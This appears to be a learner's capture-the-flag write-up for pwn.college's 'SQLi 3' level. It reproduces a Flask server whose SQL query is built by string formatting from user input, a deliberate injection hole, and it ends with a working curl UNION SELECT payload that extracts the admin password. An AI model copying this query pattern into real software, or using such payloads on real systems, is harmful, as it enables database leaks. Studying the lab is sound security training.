@@ -1,0 +1,68 @@
+#SQLi 3
+#挑战简介
+If you recall, your command injection exploits typically caused additional commands to be executed. So far, your SQL injections have simply modified the conditions of existing SQL queries. 
+However, similar to how the shell has ways to chain commands (e.g., ;, |, etc), some SQL queries can be chained as well!
+
+An attacker's ability to chain SQL queries has extremely powerful potential. For example, 
+it allows the attacker to query completely unintended tables or completely unintended fields in tables, and leads to the types of massive data disclosures that you read about on the news.
+
+This level will require you to figure out how to chain SQL queries in order to leak data. Good luck!
+
+#cat /challenge/server
+#!/opt/pwn.college/python
+
+import tempfile
+import sqlite3
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+db = TemporaryDB()
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+
+@app.route("/", methods=["GET"])
+def challenge():
+    query = flask.request.args.get("query", "%")
+
+    try:
+        # https://www.sqlite.org/lang_select.html
+        sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
+        print(f"DEBUG: {query=}")
+        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
+    except sqlite3.Error as e:
+        results = f"SQL error: {e}"
+
+    return f"""
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>{sql}</pre><br>
+        <b>Results:</b><pre>{results}</pre>
+        </body></html>
+        """
+
+app.secret_key = os.urandom(8)
+port = 8080 if os.geteuid() else 80
+app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
+app.run("challenge.localhost", port)
+
+#有改动，这次没有定义POST请求，因此我们只能用GET请求
+#GET请求这次也不一样，不是获取admin的信息，而是需要你注入SQL语言来获取password(flag)
+#主要用到"UNION"语法，UNION之后可以接另一个查询语句，得出
+curl -v "http://challenge.localhost/?query=%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=%22admin" //考了SQLi 2的引号问题
